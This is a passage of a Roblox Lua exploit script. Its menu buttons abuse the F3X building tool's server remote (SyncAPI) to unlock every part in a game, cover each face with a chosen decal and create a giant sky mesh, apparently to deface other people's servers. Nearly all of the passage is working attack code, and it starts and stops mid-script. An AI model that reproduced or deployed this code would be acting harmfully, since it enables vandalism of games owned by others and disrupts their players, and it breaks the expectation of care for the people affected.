		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						SpawnDecal(v,Enum.NormalId.Front)
						AddDecal(v,id,Enum.NormalId.Front)
	
						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,id,Enum.NormalId.Back)
	
						SpawnDecal(v,Enum.NormalId.Right)
						AddDecal(v,id,Enum.NormalId.Right)
	
						SpawnDecal(v,Enum.NormalId.Left)
						AddDecal(v,id,Enum.NormalId.Left)
	
						SpawnDecal(v,Enum.NormalId.Bottom)
						AddDecal(v,id,Enum.NormalId.Bottom)
	
						SpawnDecal(v,Enum.NormalId.Top)
						AddDecal(v,id,Enum.NormalId.Top)
					end)
				end
			end 
		end
		spam("16561811104")

end)

MainSection5:NewButton("Dreamybullify (F3X)","", function()
	--mi pan
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Sky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"8006679977")
					SetTexture(v,id)
					--end)
					MeshResize(v,Vector3.new(2100,2100,2100))
					SetLocked(v,true)
				end
			end
		end
		Sky("9894999986")

-----------------------------------

local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						SpawnDecal(v,Enum.NormalId.Front)
						AddDecal(v,id,Enum.NormalId.Front)
	
						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,id,Enum.NormalId.Back)
	
						SpawnDecal(v,Enum.NormalId.Right)
						AddDecal(v,id,Enum.NormalId.Right)
	
						SpawnDecal(v,Enum.NormalId.Left)
						AddDecal(v,id,Enum.NormalId.Left)
	
						SpawnDecal(v,Enum.NormalId.Bottom)
						AddDecal(v,id,Enum.NormalId.Bottom)
	
						SpawnDecal(v,Enum.NormalId.Top)
						AddDecal(v,id,Enum.NormalId.Top)
					end)
				end
			end 
		end
		spam("9894999986")

end)

MainSection5:NewButton("ShedletskyIfy (F3X)","", function()
	--mi pan
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Sky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"8006679977")
					SetTexture(v,id)
					--end)
					MeshResize(v,Vector3.new(2100,2100,2100))
					SetLocked(v,true)
				end
			end
		end
		Sky("172423468")

-----------------------------------

local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						SpawnDecal(v,Enum.NormalId.Front)
						AddDecal(v,id,Enum.NormalId.Front)
	
						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,id,Enum.NormalId.Back)
	
						SpawnDecal(v,Enum.NormalId.Right)
						AddDecal(v,id,Enum.NormalId.Right)
	
						SpawnDecal(v,Enum.NormalId.Left)
						AddDecal(v,id,Enum.NormalId.Left)
	
						SpawnDecal(v,Enum.NormalId.Bottom)
						AddDecal(v,id,Enum.NormalId.Bottom)
	
						SpawnDecal(v,Enum.NormalId.Top)
						AddDecal(v,id,Enum.NormalId.Top)
					end)
				end
			end 
		end
		spam("172423468")

end)

MainSection5:NewButton("c00lkiddify (F3X)","", function()

	--skiddd
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Sky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"8006679977")
					SetTexture(v,id)
					--end)
					MeshResize(v,Vector3.new(2100,2100,2100))
					SetLocked(v,true)
				end
			end
		end
		Sky("158118263")

-----------------------------------

local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						SpawnDecal(v,Enum.NormalId.Front)
